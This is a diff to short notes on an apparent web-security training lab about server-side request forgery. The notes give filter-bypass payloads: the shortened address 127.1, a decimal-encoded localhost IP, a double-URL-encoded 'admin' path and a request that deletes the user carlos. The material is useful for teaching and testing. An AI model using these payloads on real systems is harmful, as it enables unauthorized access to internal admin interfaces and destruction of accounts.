@@ -6,7 +6,15 @@ Goal - change the stock check URL to access the admin interface at http://localh
 
 Analysis:
 
-localhost: http://127.1/
+1. localhost: http://127.1/    Note: 127.1 is automatically fill the octet that are missing in 127.0.0.1, so we are allowed to use that
+
+The above works, so we understand that they are not doing regex match on string 127.1.
+Also, you have couple of other option to bypass this. You could use decimal encoded version of the IP_address or the octal representation of the ip address. Please search "IP address to decimal version"
+
+Eg: localhost: http://2130706433/  This should work in burp
+
+
+
 admin interface: http://127.1/%25%36%31dmin
 delete carlos:  http://127.1/%25%36%31dmin/delete?username=carlos
 
